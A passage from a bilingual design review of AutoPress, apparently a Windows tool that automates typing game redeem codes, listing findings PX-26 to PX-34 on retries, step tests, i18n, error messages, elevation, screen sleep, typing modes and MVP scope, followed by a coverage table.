    - Where: `codes/queue.py:106-107` (FAILED, and REVIEW with attempts > 0, become PENDING); SPEC 2.5 (REVIEW
      「中斷於送出後，請確認是否已兌換」); `recover_after_crash` (RUNNING → REVIEW).
    - Problem: the one-click retry resets "please confirm" items without asking. A code that was redeemed is sent
      again, which costs rate-limit budget; the second answer, "already used", replaces the success in the
      user's memory.
    - Fix: 重試失敗 resets FAILED only. REVIEW items get a separate 「確認後重試」 list that shows the evidence.

27. **PX-27 · minor · 測試此步驟 has no countdown, no hotkeys and no stop button, and its sample code goes to the real server; the SPEC table gives the wrong click_text default**
    - Where: SPEC 6.4.2 (873-874); `RunSession.test_step` runs outside RunFlow; `sample_code "TEST-1234"`; SPEC 5.3
      (743 lists text ("兌換|Redeem") as the default), while `make_step(CLICK_TEXT).params.text == ''` (checked in
      `t_profile.py`), which fails validation with an ERROR.
    - Problem: real step tests start at once. Long steps (wait_text up to 600 s, a key repeated 100 times) cannot
      be stopped from the Profiles page. Testing the submit step sends "TEST-1234", which some services count
      against their invalid-attempt limits.
    - Fix: give tests a 3 s countdown, a 停止測試 button and hotkeys; default to the dry run; warn when the tested
      step submits; correct either the table or the default.

28. **PX-28 · minor · i18n leftovers**
    - Where: `codes/queue.py:111` (the crash-recovery message is hard-coded in Chinese; `tests/fakes.py` copies
      it); SPEC 2.5 and 5.7 give persisted messages in Chinese only (「中斷於送出後…」, 「手動標記」, 「紀錄顯示已兌換過」);
      `logsetup.py:72` (the crash toast is the raw "ExcType: message"); SPEC 2.8 (the welcome dialog appears
      after MainWindow is built, and a language change needs a restart) and `ui/welcome.py:4` (offers a language
      choice); 3.2 (user guide in zh-TW only); `i18n.system_language` (Simplified Chinese systems get zh-TW).
    - Problem: persisted messages freeze in whatever language was active when they were written. Crash toasts
      are English developer text. Choosing English in the first-run welcome dialog only takes effect after a
      restart. English users have no guide.
    - Fix: give every persisted message an English pair in the SPEC, and store a message key (rendered with
      `tr` when shown) or both texts. Make the crash toast 「發生未預期的錯誤，已記錄在紀錄檔」 with an 開啟資料夾
      action. Show the welcome dialog before MainWindow is built, or restart automatically. Link an English quick
      start from the README's English section.

29. **PX-29 · minor · Many error messages do not say what to do, and some failures have no message at all**
    - Where: SPEC 7.1 rows at lines 937 (找不到文字), 938 (輸入內容與序號不符), 927 (點擊位置被其他視窗遮住), 936
      (剪貼簿被佔用), 939 (無法讀取圖片), 923 (OCR engine {reason}), 931 (連續 n 筆失敗) and 921 (standard user).
    - Problem and suggested wording:
      - "Text not found" should say 「確認兌換視窗已開啟，或在設定檔調整要找的文字／搜尋範圍」.
      - "Mismatch" should suggest 「改用「貼上」或關閉注音」.
      - "Covered" should name the covering window, which may be AutoPress's own bar (PX-03).
      - "Clipboard busy" should suggest 「改用模擬鍵入」.
      - "OCR failed" should say 「請重新下載完整壓縮檔，或檢查防毒是否隔離了檔案」.
      - The standard-user row should suggest the web redeem page.

      No message exists for UnmappableChar (VK mode, a character missing from the layout), OcrTimeout,
      CaptureError, `bring_to_foreground` failing (which is not the same as losing focus), or unexpected errors
      (PX-15).
    - Fix: add a "what to do" clause to each 7.1 row, and add rows for the missing cases.

30. **PX-30 · minor · Running as administrator has side effects the SPEC does not mention**
    - Where: SPEC 6.4.3 (`restart_admin` action, then quit); 2.8 (single-instance QLockFile); 6.4.1 (drag-and-drop
      import).
    - Problem (standard Windows behaviour, not measured here): Explorer cannot drag files into an elevated
      window, so the Codes page refuses drops without saying why. The elevated instance may start while the old
      instance still holds the lock: shutdown joins the runner for up to 3 s and OCR for up to 2 s. The new
      instance then exits with 「AutoPress 已在執行中」.
    - Fix: Help note 「以系統管理員身分執行時無法拖放，請用「開啟檔案」」; pass `--restarted` and retry the lock for
      about 5 s.

31. **PX-31 · minor · Long runs are not protected from display sleep and screen lock**
    - Where: `RunPolicy.cooldown_s` default 300 (`models.py:1186`); SPEC 2.5. The SPEC never mentions keeping the
      screen awake.
    - Problem: a 5-minute cool-down equals common laptop display-off and lock timeouts. A locked session gives a
      foreground window of 0 and black captures, so the run pauses or produces REVIEW items mid-batch.
    - Fix: call `SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED)` while a run is
      active and clear it at the end (standard API, not measured here).

32. **PX-32 · minor · Typing modes were verified only against Qt widgets; browsers and game engines are not listed as unverified**
    - Where: `docs/research/win32_input.md` section 1 (the test target is a PyQt6 app) and `:177` (unicode
      VK_PACKET input is invisible to raw input: 0/50); SPEC 11 does not list this; SPEC 5.3 and 5.6 make unicode
      the default for every step.
    - Problem: the default unicode mode may type nothing into games that read raw input or poll keys. Behaviour
      under the Bopomofo IME in Chrome or Edge is unmeasured, yet the design preview tells users the default is
      100 % correct.
    - Fix: add this to SPEC 11. The in-game template defaults to VK mode with IME closing and a 30 ms hold
      (research section 9); or the wizard's 測試一筆 uses `verify_region` and suggests another mode when nothing
      was typed.

33. **PX-33 · minor · History grouping depends on a free-text game name**
    - Where: `Profile.game_key` (`game:<squashed name>`, or `profile:<id>` when empty); SPEC 5.2; 6.4.2 (basics
      card).
    - Problem: 「原神」, "Genshin" and "Genshin Impact" become three separate histories. A profile without a game
      falls back to `profile:<id>`, so re-creating it from the template loses history skip. Shared profiles bring
      the author's spelling.
    - Fix: make the game field a combo of existing names (`history.games()`) that still accepts new text. Templates
      preset the game. Warn when a new name is close to an existing one.

34. **PX-34 · minor · MVP scope: several extras could wait in favour of the gaps above**
    - Where: SPEC 1.1 (47-55).
    - Evidence: requirements.md does not ask for any of these:
      - a daily cap;
      - portable mode, with its %TEMP% fallback;
      - a "system" theme;
      - evidence thumbnails and an image viewer;
      - `{date}` and `{time}` placeholders;
      - wait_text's "disappear" mode;
      - three clear methods;
      - eight presets;
      - Korean keywords (the OCR model cannot read Hangul: ocr.md U3 gives ko 0 %);
      - the hotkey conflict test.

      Each one adds UI, tests and integration surface for eight groups working in parallel, while the core loop
      still lacks PX-02, PX-06, PX-07, PX-08 and PX-18.
    - Fix: move these to 1.2 Deferred, keeping the data fields so later versions stay compatible, and spend the
      effort on the core-loop fixes.

---

## Coverage of the requested lens (where each topic landed)

| Topic | Items |
|---|---|
| First-run experience | PX-21, PX-22, PX-18, PX-28 |
| Sharing across resolution, DPI and window size | PX-16, PX-17, PX-01, PX-33 |
| Wrong window, stuck keys, rate limits, Enter in chat, failsafe | PX-01, PX-03, PX-09, PX-10, PX-11, PX-12, PX-13, PX-05, PX-31 |
| i18n completeness | PX-23, PX-28 |
| Error messages that tell the user what to do | PX-29, PX-20, PX-15 |
| Minimized, elevated or exclusive-fullscreen game; multi-monitor; window moved or resized | PX-20, PX-30, PX-12, PX-03, PX-15, PX-16 |
| Lowercase and dashes, duplicates, OCR misreads | PX-19, PX-02, PX-18, PX-06 |
| Scope creep versus MVP | PX-34, PX-25 |
| Can the step model express the ux.md flows (web page, in-game dialog, popup dismissal) | PX-08, PX-09, PX-07, PX-04, PX-16 |
